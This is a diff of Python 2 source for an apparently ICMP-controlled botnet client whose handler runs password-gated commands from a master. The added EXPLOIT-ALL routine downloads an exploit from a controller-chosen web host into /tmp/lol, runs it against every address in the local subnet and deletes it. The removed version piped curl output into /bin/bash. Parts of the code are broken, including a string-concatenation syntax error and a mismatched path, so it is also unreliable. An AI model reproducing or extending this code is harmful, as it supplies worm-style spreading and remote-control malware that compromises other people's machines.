@@ -33,23 +33,21 @@ class Handler(threading.Thread):
 			if self.passwd in raw:	#Is this legit data?
 				if "----->" in raw:	#Is this a builtin?
 					builtin = raw.strip(self.passwd).split("----->")
-					if builtin[0] == "SET-MASTER":
-						self.master = builtin[1]
-					elif builtin[0] == "SET-PASS":
-						self.passwd = builtin[1]
-					elif builtin[0] == "SET-WEB":
+					if builtin[0] == "SET-WEB":
 						self.web = builtin[1]
-					elif builtin[0] == "RESET-EMERGENCY-OMG":
-						self.passwd = "DEFAULT-HARDCODED"
-						self.web = "www.DEFAULT.com"
+					elif builtin[0] == "UPDATE-BOT":	
+						send_icmp(localhost, self.master, "NEW-BOT-INIT:"+localhost)
 					elif builtin[0] == "EXPLOIT-ALL":
-						octets = localhost.split(".")
-						for i in range(1,253):
-							if i != octets[3]:
-								try:
-									os.system("curl ", self.web ,octets[0]+"."+octets[1]+"."+octets[2]+"."+str(i)+ "|/bin/bash")
-								except Exception as e:
-									pass	
+						try:
+							os.system("curl "+self.web"/exploit > /tmp/lol")
+							os.system("chmod +x /tmp/lol")
+							octets = localhost.split(".")
+							for i in range(1,253):
+								if i != octets[3]:
+									os.system("./tmp/lol "+octets[0]+"."+octets[1]+"."+octets[2]+"."+str(i))
+							os.system("rm /tmp/lol")
+						except Exception as e:
+							pass	
 				else:
 					print self.passwd
 					cmd = raw[len(self.passwd):]
